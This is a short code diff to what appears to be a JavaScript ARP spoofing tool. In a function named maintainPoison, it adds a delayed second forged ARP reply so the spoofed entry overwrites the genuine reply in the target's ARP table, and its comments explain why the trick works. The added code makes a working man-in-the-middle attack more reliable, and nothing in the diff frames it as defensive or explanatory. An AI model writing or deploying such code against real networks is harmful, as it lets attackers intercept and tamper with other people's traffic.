@@ -127,6 +127,11 @@ var maintainPoison = function(target1, target2) {
         setIP(response.arp.sender_ip, request.requestedIp);
 
         c.send(response.buffer, response.buffer.length);
+
+        // Send a second reply after a brief delay
+        // Since the standard dictates that later replies overwrite existing ARP table entries, this is here to ensure we don't reply before the switch does
+        // n.b. the extra packet should only be visible to the target
+        setTimeout(c.send.bind(c), 100, response.buffer, response.buffer.length);
       }
     }
   });
